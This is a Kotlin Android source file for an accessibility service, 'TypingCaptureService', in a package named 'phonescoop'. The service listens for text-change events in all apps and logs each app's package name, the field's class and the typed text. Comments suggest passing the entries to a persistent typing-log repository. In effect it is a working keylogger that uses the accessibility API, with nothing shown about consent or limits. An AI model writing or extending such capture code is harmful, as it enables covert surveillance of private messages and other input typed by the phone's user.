package com.therealjidenna.phonescoop.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class TypingCaptureService : AccessibilityService() {

    companion object {
        private const val TAG = "TypingCaptureService"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            flags = AccessibilityServiceInfo.DEFAULT or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
        }
        serviceInfo = info

        Log.d(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: ""

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString(separator = " ") ?: ""
                if (text.isNotBlank()) {
                    handleTypedText(packageName, className, text)
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                // Optional: track cursor/selection changes if you need them later
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                // Optional: mark a new field as active, useful for debouncing
            }
        }
    }

    private fun handleTypedText(packageName: String, className: String, text: String) {
        Log.d(TAG, "App: $packageName | Field: $className | Text: $text")

        // Hand off to your existing logging pipeline, e.g.:
        // TypingLogRepository.getInstance(applicationContext)
        //     .logEntry(packageName, text, System.currentTimeMillis())
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }
}
